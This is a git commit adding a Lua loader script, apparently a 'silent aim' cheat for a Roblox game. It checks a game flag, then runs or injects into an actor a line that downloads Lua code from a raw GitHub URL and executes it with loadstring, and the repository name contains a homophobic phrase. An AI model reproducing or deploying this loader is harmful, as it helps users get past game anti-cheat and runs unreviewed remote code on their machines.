501b0d73b93274507c5be71d48a450647fb87e93
authorityenforcement <enforceauthority@gmail.com>
2025-11-06 19:45:21 +0300

    Create silentaimloader.lua

---
+++ silentaimloader.lua
@@ -0,0 +1,28 @@
+local actors = getactors()
+local function CheckFFlagValue(Name, Value)
+	local Success, Result = pcall(getfflag, Name)
+	if not Success then
+		return false
+	end
+
+	if typeof(Result) == "boolean" then
+		return Result
+	end
+
+	if typeof(Result) == "string" then
+		return Result == tostring(Value)
+	end
+
+	return false
+end
+local function LoadScript()
+    return [=[
+        print("hii")
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RelkzzRebranded/BloodDebtIsGay/refs/heads/main/core.lua"))()
+    ]=]
+end
+if CheckFFlagValue("DebugRunParallelLuaOnMainThread", true) then
+    loadstring(LoadScript())()
+else
+    run_on_actor(actors[1], LoadScript())
+end
